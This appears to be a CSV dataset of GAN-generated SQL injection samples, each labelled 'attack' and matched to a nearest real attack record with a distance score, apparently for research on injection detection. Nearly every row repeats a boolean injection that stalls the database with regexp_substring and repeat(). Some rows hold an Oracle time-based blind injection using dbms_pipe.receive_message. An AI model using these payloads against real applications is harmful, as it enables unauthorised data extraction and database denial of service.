id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
GAN_000197,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.7762678165769343
GAN_000198,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.889762036806127
GAN_000199,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.902565884723688
GAN_000200,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.908912250912323
GAN_000201,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.922885687782394
GAN_000202,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.7927993687394945
GAN_000203,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.7372671235372708
GAN_000204,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.9165128147422648
GAN_000205,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.8602311276469092
GAN_000206,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.7956040250565817
GAN_000207,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.901797510921955
GAN_000208,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.7676566917068057
GAN_000209,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.7965480816876287
GAN_000210,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.8815815954122947
GAN_000211,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.8600646073945994
GAN_000212,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.922082995272807
GAN_000213,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,4.045356480505026
GAN_000214,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,4.029714605490784
GAN_000215,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.87715266454308
GAN_000216,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.9529562363485136
GAN_000217,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.960798477387463
GAN_000218,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000012,4.011671935449309
GAN_000219,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.834916307861541
GAN_000220,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.8160687400395967
GAN_000221,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000012,4.047461787321497
GAN_000222,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.9273140516864076
GAN_000223,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.8155442983332986
GAN_000224,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.850396419049419
GAN_000225,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.7124914204907853
GAN_000226,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.9115823860081362
GAN_000227,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.9715925225535953
GAN_000228,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.904796619221668
GAN_000229,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.873794706250361
GAN_000230,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.8946811350997717
GAN_000231,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.8059929573449143
GAN_000232,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.6913467044085224
GAN_000233,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000012,3.9174499528138966
GAN_000234,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.899668839454959
GAN_000235,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.808959234294023
GAN_000236,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.8185708781838255
GAN_000237,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.776178392915949
GAN_000238,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.958305501591472
GAN_000239,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.9178190343993395
GAN_000240,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.865951638368521
GAN_000241,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.815151219447583
GAN_000242,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.7667639804620645
GAN_000243,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.8644155570485634
GAN_000244,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.824580107348706
GAN_000245,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.68448870601429
GAN_000246,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.842997925533324
GAN_000247,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.827398414462992
GAN_000248,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.87524254754008
GAN_000249,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.880206949430292
GAN_000250,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.7921813853062036
GAN_000251,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.9366211070896915
GAN_000252,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.804967022689292
GAN_000253,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.7838788272077886
GAN_000254,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.875606057101314
GAN_000255,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.8995905014892576
GAN_000256,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.9087536048617704
GAN_000257,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.895192258828359
GAN_000258,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.8784366082752
GAN_000259,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000012,3.8435091203436866
GAN_000260,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.84732620895143
GAN_000261,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.9386771016728996
GAN_000262,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.7858797460024545
GAN_000263,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.8837309682458447
GAN_000264,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.8846348179042165
GAN_000265,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.8489219549981524
GAN_000266,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.789281723773449
GAN_000267,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.8405972057194977
GAN_000268,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.70942787255344
GAN_000269,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.7506847542417447
GAN_000270,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.8202049810010794
GAN_000271,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.7061229822664896
GAN_000272,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.8926957838181298
GAN_000273,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.9370454687551715
GAN_000274,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.9645849393205808
GAN_000275,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.901668475483851
GAN_000276,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.8542511133510557
GAN_000277,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.894494899257611
GAN_000278,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.910237472168432
GAN_000279,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.908749101676929
GAN_000280,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,4.024908807044258
GAN_000281,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.8755948008449597
GAN_000282,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.880139650841536
GAN_000283,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.9804050292157265
GAN_000284,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,4.05526729334117
GAN_000285,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,4.0221073050395955
GAN_000286,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.9274736742490894
GAN_000287,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.8025205503347568
GAN_000288,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.8232736249747736
GAN_000289,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000012,4.009758432715378
GAN_000290,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.912344605868561
GAN_000291,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.777866594845035
GAN_000292,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.8829362122747693
GAN_000293,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.8427261323783393
GAN_000294,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,3.8702305302790263
